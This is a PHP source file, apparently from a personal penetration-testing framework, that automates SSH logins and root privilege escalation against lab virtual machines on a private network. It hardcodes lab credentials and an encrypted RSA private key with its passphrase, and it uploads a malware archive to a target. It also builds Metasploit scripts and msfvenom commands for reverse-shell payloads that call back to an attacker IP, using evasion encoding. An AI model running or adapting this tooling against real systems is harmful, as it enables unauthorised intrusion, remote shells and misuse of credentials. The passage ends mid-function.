<?php
class poc4lan extends poc4web {
    
    
    public function __construct() {
        parent::__construct();
        
    }
   
    
    
    public function poc4lan4crypto(){
        // ######### CRYPTOGRAPHY #############
        $this->poc4crypto();
        // ###########################
        
        ssl ();
        https ();
        
        // openssl s_client -host google.com -port 443 -prexit -showcerts
        
        // ssTitre("Creates a 2048-bit RSA key pair and generates a Certificate Signing Request for it");
        // requette("openssl req -new -nodes -newkey rsa:2048 -keyout newprivate.key -out request.csr");
        $this->pause();
        // ###########################
    }
    
    
    
    
    public function poc4root8users(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        
        $ip = $this->k2; // k2
        $port = "22";
        $protocol = "T";
        $user_name_created = "user" ;
        $user_name_pass = "password";
        
        $ip = "10.60.10.135"; // Cyberry
        $port = "22";
        $protocol = "T";
        
        $user_name_created = "root" ;
        $user_name_pass = "chewbacabemerry";
        $user_name_created = "mary" ;
        $user_name_pass = "bakeoff";
        $user_name_created = "nick" ;
        $user_name_pass = "custodio";
        
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm){
        $this->gitre(__FUNCTION__);
        
        $eth = trim($eth);
        $domain = trim($domain);
        $ip = trim($ip);
        $port = trim($port);
        $protocol = trim($protocol);
        $login = trim($login);
        $pass = trim($pass);
        $titre = trim($titre);
        $fonction2exec = trim($fonction2exec);
        $vm = trim($vm);
        $this->titre(__FUNCTION__);
        
        $victime = new vm($vm);
        $victime->vm2upload("$this->dir_tools/Malware/ISHELL-v0.2.tar.gz","$this->vm_tmp_lin/ISHELL-v0.2.tar.gz");
        
        $flag_poc = FALSE;
        $flag_poc = TRUE;
        
        $test = new SERVICE4COM($eth,$domain,$ip, $port, $protocol);
        $test->poc($flag_poc);
        $stream = $test->stream8ssh8passwd($test->ip, $test->port, $login,$pass);
        
        $template_cmd = "sshpass -p '$pass' ssh -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $login@$test->ip -p $test->port -C  '%CMD%'";
        list($stream,$template_id,$template_cmd,$template_shell) = $test->stream4check($stream,$template_cmd,$login,$pass);
        
        if (is_resource($stream)){
            $templateB64_id = base64_encode($template_id);
            $templateB64_cmd = base64_encode($template_cmd);
            $templateB64_shell = base64_encode($template_shell);
            
            $data = "/usr/bin/id";
            $rst_id = $test->stream4result($stream, $data, 10);
            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $test->parse4id($rst_id);
            $this->article("CREATE Template ID", $template_id);
            $this->article("CREATE Template CMD", $template_cmd);
            $this->article("CREATE Template SHELL", $template_shell);
            $this->pause();
            $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$user_name_pass);
            $obj_lan->poc($test->flag_poc);
            
            return $obj_lan->$fonction2exec();
        }
    }
    
    
    
    public function poc4root8suid8app2find(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = $this->k2; // k2
        $port = "22";
        $protocol = "T";
        $user_name_created = "user" ;
        $user_name_pass = "password";
        
        $ip = "10.60.10.137"; // DC-1
        $port = "22";
        $protocol = "T";
        $user_name_created = "flag4" ;
        $user_name_pass = "orange";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
        
    }
    
    
    public function poc4root8users2sudoers8app2write8cp2etc_passwd(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        /*
         la restriction ne fonctionne pas avec ce script, tout fonctionne normalement !!! OK
         */
        $ip = "10.60.10.141"; // DC-2
        $port = "7744";
        $protocol = "T";
        $user_name_created = "jerry" ;
        $user_name_pass = "adipiscing";
        $user_name_created = "tom" ;
        $user_name_pass = "parturient";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
        
    }
    
    
    
    public function poc4root8users2sudoers8app2cmd2git(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        /*
         la restriction ne fonctionne pas avec ce script, tout fonctionne normalement !!! OK
         */
        $ip = "10.60.10.141"; // DC-2
        $port = "7744";
        $protocol = "T";
        $user_name_created = "jerry" ;
        $user_name_pass = "adipiscing";
        $user_name_created = "tom" ;
        $user_name_pass = "parturient";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8su(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        /*
         la restriction ne fonctionne pas avec ce script, tout fonctionne normalement !!! OK
         */
        $ip = "10.60.10.140"; // Matrix1
        $port = "22";
        $protocol = "T";
        $user_name_created = "guest" ;
        $user_name_pass = "k1ll0r7n";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    public function poc4root8suid8app2vim(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.139"; // Basic Penetration Testing Two
        $port = "22";
        $protocol = "T";
        $user_name_created = "jan" ;
        $user_name_pass = "armando";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8keypriv(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.139"; // Basic Penetration Testing Two
        $port = "22";
        $protocol = "T";
        $user_name_created = "jan" ;
        $user_name_pass = "armando";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    
    public function poc4root8suid8app2write2etc_sudoers(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.139"; // basic pentesting 2
        $port = "22";
        $protocol = "T";
        $user_name_created = "kay" ;
        $private_key_str = "-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75
            
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
-----END RSA PRIVATE KEY-----";
        $private_key_passwd = "beeswax";
        
        $hash_sha1 = sha1($private_key_str);
        
        
        $private_key_file = "/tmp/$hash_sha1.priv";
        $this->str2file($private_key_str, $private_key_file);
        $public_key_file = "/tmp/$hash_sha1.pub";
        
        //$private_key_file = "/tmp/$hash_sha1.priv.tmp";
        //$public_key_file = "$private_key_file.pub";
        
        
        
        $flag_poc = FALSE;
        $flag_poc = TRUE;
        
        $test = new SERVICE4COM($eth,$domain,$ip, $port, $protocol);
        $test->poc($flag_poc);
        $test->key2gen4public("", 10, $private_key_file, $public_key_file, $private_key_passwd);
        
        
        $stream = $test->stream8ssh8key8public($test->ip, $test->port, $user_name_created, $public_key_file, $private_key_file, $private_key_passwd);
        
        $template_cmd = "ssh $user_name_created@$test->ip -p $test->port -i $private_key_file.pem -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -C  \"%CMD%\"";
        list($stream,$template_cmd) = $test->stream4check($stream,$template_cmd,$user_name_created,$user_name_pass);
        
        
        //$stream = $test->stream8ssh2key8priv4str($test->ip, $test->port, $user_name_created,$private_key_str, $private_key_file, $private_key_passwd);
        //$test->stream4root($stream);
        
        if (is_resource($stream)){
            //$test->openvas($ip);
            //var_dump($stream);echo get_resource_type($stream);$test->pause();
            //$test->yesAUTH($test->ip, $test->port, $test->protocol, $user_name_created, $user_name_pass, "", "", "", "", "", __FUNCTION__, $test->ip2geoip());
            $template_id = "%ID%";
            $templateB64_id = base64_encode($template_id);
            $templateB64_cmd = base64_encode($template_cmd);
            
            $data = "id";
            $rst_id = $test->stream4result($stream, $data, 10);
            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $test->parse4id($rst_id);
            $this->article("CREATE Template ID", $template_id);
            $this->article("CREATE Template BASE64 ID", $templateB64_id);
            $this->article("CREATE Template CMD", $template_cmd);
            $this->article("CREATE Template BASE64 CMD",$templateB64_cmd);
            $template_shell = str_replace("%CMD%", "%SHELL%", $template_cmd);
            $templateB64_shell = base64_encode($template_shell);
            $this->article("CREATE Template SHELL", $template_shell);
            $this->article("CREATE Template BASE64 SHELL", $templateB64_shell);
            
            $user_name_pass = "";
            $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$user_name_pass);
            $obj_lan->poc($test->flag_poc);
            
            
            
            //$strings_etc_passwd = $obj_lan->lan2stream4result($data, $timeout);
            //$obj_lan->parse4etc_passwd($strings_etc_passwd);
            //$obj_lan->misc2keys();$this->pause();
            //$obj_lan->jobs();
            
            
            
            $suid_path = "/usr/bin/vim.basic";
            //$obj_lan->suids4one($suid_path);
            return $obj_lan->users2sudoers();
            
            
        }
        
        
    }
    
    
    
    public function poc4root8suid8app2lib(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = $this->k2; // k2
        $port = "22";
        $protocol = "T";
        $user_name_created = "user" ;
        $user_name_pass = "password";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    public function poc4root8exploit8kernel_44298_CVE_2017_16995(){ //
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    public function poc4root8exploit8app_41154_screen(){ //
        $this->gtitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    public function poc4root8exploit8app_38362_sudoedit(){ //
        $this->gtitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        
        $ip = "10.60.10.151"; // PumpkinGarden
        $port = "3535";
        $protocol = "T";
        $user_name_created = 'scarecrow' ;
        $user_name_pass = '5Qn@$y';
        
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8exploit8kernel_test(){ //
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.153"; // DeRKnStiNK
        $port = "22";
        $protocol = "T";
        $user_name_created = "mrderp" ;
        $user_name_pass = "derpderpderpderpderpderpderp";
        
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    
    public function poc4root8exploit8kernel_39166_CVE_2015_8660(){ //
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.138"; // analoguepond
        $port = "22";
        $protocol = "T";
        $user_name_created = "eric" ;
        $user_name_pass = "therisingsun";
        
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    
    public function poc4root8exploit8kernel_40616_CVE_2016_5195(){ //
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.152"; // Lampiao
        $port = "22";
        $protocol = "T";
        $user_name_created = "tiago" ;
        $user_name_pass = "Virgulino";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
        
    }
    
    
    public function poc4root8exploit8kernel_37292_CVE_2015_1328(){ // OK
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.147"; // OK typhoon 1.02 exploit_37292
        $port = "22";
        $protocol = "T";
        $user_name_created = "typhoon" ;
        $user_name_pass = "789456123";
        
        
        $ip = "10.60.10.148"; // OK Super Mario exploit_37292
        $port = "22";
        $protocol = "T";
        $user_name_created = "luigi" ;
        $user_name_pass = "luigi1";
        
        $ip = "10.60.10.149"; // OK SecOS 1 exploit_37292
        $port = "22";
        $protocol = "T";
        $user_name_created = "spiderman" ;
        $user_name_pass = "CrazyPassword!";
        
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8exploits(){
        $this->ssTitre(__FUNCTION__);
        $eth = "vmnet6";
        $domain = "hack.vlan";
        $ip = "10.60.10.129";
        $port = 21 ;
        $protocol = 'T';
        $attacker_ip = "10.60.10.1";
        $attacker_port = "8888";
        $type = "server";
        $timeout = 60 ;
        $flag_poc = TRUE ;
        
        $obj_service = new SERVICE($eth, $domain, $ip, $port, $protocol);
        $obj_service->poc($flag_poc);
        $obj_service->service2exploitdb();
        exit();
        $obj_service->pause();
        $exploit = "exploit/unix/ftp/vsftpd_234_backdoor";
        $info = $exploit;
        $payloads = $obj_service->service8msf8exploit2payloads($exploit);
        $payloads = array_filter($payloads);
        $obj_service->pause();
        foreach ($payloads as $payload){
            echo $obj_service->service8msf8exploit2payload2options($exploit, $payload);
            $obj_service->pause();
        }
        exit();
        $exploit_rc = "$obj_service->dir_tmp/"."$obj_service->eth.$obj_service->domain.$obj_service->ip.$obj_service->port.$obj_service->protocol.$obj_service->service_name.rc";
        $str2file =  "db_status\nuse $info\nset RHOSTS $obj_service->ip\nset RPORT $obj_service->port\nset payload linux/x86/shell_reverse_tcp\nset LHOST $attacker_ip\nset LPORT $attacker_port\nrun\nexit\n";
        $obj_service->str2file($str2file, $exploit_rc);
        $obj_service->service8msf($exploit_rc, $attacker_port, $info, $type, $timeout);
        exit();
        
        
        $obj_service->cmd("localhost", " msfcli exploit/unix/ftp/vsftpd_234_backdoor RHOST=$this->msf E");
        $obj_service->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set payload linux/x86/shell_reverse_tcp;set LHOST $attacker_ip;set LPORT $attacker_port;run;\" ");
        $query = "msfvenom --payload  linux/x86/shell_reverse_tcp LHOST=$attacker_ip LPORT=$attacker_port --platform linux --arch x86 --encoder  x86/shikata_ga_nai  --iterations 10 --format elf ";
        $query = "msfvenom -p cmd/unix/reverse_python LHOST=$attacker_ip LPORT=$attacker_port --format raw ";
        
        $query = "echo \"db_status\nuse auxiliary/scanner/netbios/nbname\nset RHOSTS $this->ip\nset RPORT $this->port\nset THREADS 8\nrun\nexit\n \" > $this->dir_tmp/".__FUNCTION__.".$this->ip.$this->port.rc && echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".$this->ip.$this->port.rc "; // -y /usr/share/metasploit-framework/config/database.yml" ;
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        
        $this->pause();
        $query = " nmap -sC irc-find -Pn -vvv -p6667 $this->msf -n --reason -e $this->eth_lan";
        $this->requette($query);
        $this->pause();
        exploitdb("unreal linux 3.2.8.1");
        $this->cmd("localhost", " msfcli exploit/unix/irc/unreal_ircd_3281_backdoor RHOST=$this->msf E");
        $this->pause();
        /*
         * exploitdb("postgresql");
         * cmd("localhost"," msfcli auxiliary/scanner/postgres/postgres_version RHOSTS=$this->msf E");
         * cmd("localhost"," msfcli exploit/linux/postgres/postgres_payload RHOST=$this->msf E");pause();
         */
        $this->ssTitre("distccd");
        // Daemon user
        exploitdb("distcc");
        $this->net("http://www.delafond.org/traducmanfr/man/man1/distccd.1.html");
        $this->pause();
        $this->cmd("localhost", " msfcli exploit/unix/misc/distcc_exec RHOST=$this->msf E");
        $this->pause();
        $this->ssTitre("JAVA RMI");
        exploitdb("rmi");
        $this->cmd("localhost", " msfcli exploit/multi/misc/java_rmi_server RHOST=$this->msf TARGET=2 E");
        $this->pause();
        exploitdb("openssh");
        $this->ssTitre("Domain");
        $this->requette("dig @$this->msf version.bind txt chaos +short");
        $this->pause();
    }
    
    
    
    
    
    
    public function poc4bypass_restricted_test(){ // OK
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.147"; // OK typhoon 1.02 exploit_37292
        $port = "22";
        $protocol = "T";
        $user_name_created = "typhoon" ;
        $user_name_pass = "789456123";
        
        
        $ip = "10.60.10.148"; // OK Super Mario exploit_37292
        $port = "22";
        $protocol = "T";
        $user_name_created = "luigi" ;
        $user_name_pass = "luigi1";
        
        $ip = "10.60.10.149"; // OK SecOS 1 exploit_37292
        $port = "22";
        $protocol = "T";
        $user_name_created = "spiderman" ;
        $user_name_pass = "CrazyPassword!";
        
        
        $ip = "10.60.10.163"; // 64Base 1.01
        $port = "62964";
        $protocol = "T";
        $user_name_created = "64base" ;
        $user_name_pass = 'NjRiYXNlNWgzNzcK';
        
        
        $ip = "10.60.10.140"; // Matrix1
        $port = "22";
        $protocol = "T";
        $user_name_created = "guest" ;
        $user_name_pass = "k1ll0r7n";
        
        $ip = "10.60.10.141"; // DC-2
        $port = "7744";
        $protocol = "T";
        $user_name_created = "jerry" ;
        $user_name_pass = "adipiscing";
        $user_name_created = "tom" ;
        $user_name_pass = "parturient";
        
        $ip = "10.60.10.163"; // 64Base 1.01
        $port = "62964";
        $protocol = "T";
        
        $login = "64base" ;
        $pass = 'NjRiYXNlNWgzNzcK';
        $titre = "restricted Bash - rbash";
        $fonction2exec = "lan2start";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8jobs(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.133"; // Lin.Security v1.0
        $port = "22";
        $protocol = "T";
        
        $user_name_created = "susan" ;
        $user_name_pass = "MySuperS3cretValue!";
        $user_name_created = "insecurity" ;
        $user_name_pass = "P@ssw0rd";
        $user_name_created = "root" ;
        $user_name_pass = "secret123";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8users2sudoers8filepath(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.133"; // Lin.Security v1.0
        $port = "22";
        $protocol = "T";
        $user_name_created = "insecurity" ;
        $user_name_pass = "P@ssw0rd";
        $user_name_created = "root" ;
        $user_name_pass = "secret123";
        $user_name_created = "susan" ;
        $user_name_pass = "MySuperS3cretValue!";
        $user_name_created = "bob" ;
        $user_name_pass = "secret";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8users2root(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.133"; // Lin.Security v1.0
        $port = "22";
        $protocol = "T";
        
        $user_name_created = "bob" ;
        $user_name_pass = "secret";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8users2sudoers2app2cmd(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.143"; // DC-6
        $port = "22";
        $protocol = "T";
        $user_name_created = "graham" ;
        $user_name_pass = "GSo7isUM1D4";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8users2sudoers2app2read8teehee(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.142"; // DC-4
        $port = "22";
        $protocol = "T";
        $user_name_created = "jim" ;
        $user_name_pass = "jibril04";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8users2sudoers2nopassword(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        
        $ip = $this->k2; // Cyberry
        $port = "22";
        $protocol = "T";
        $user_name_created = "user" ;
        $user_name_pass = "password";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    
    
    public function poc4bypass_restricted_path(){ // OK
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
               
        $ip = "10.60.10.163"; // 64Base 1.01
        $port = "62964";
        $protocol = "T";

        
        $login = "64base" ;
        $pass = 'NjRiYXNlNWgzNzcK';
        $titre = "restricted Bash - rbash";
        $fonction2exec = "lan2start";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    
    
    
    public function poc4root8jobs8file2backdoor4bash(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.132"; // Escalate Linux
        $port = "80";
        $protocol = "T";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
        
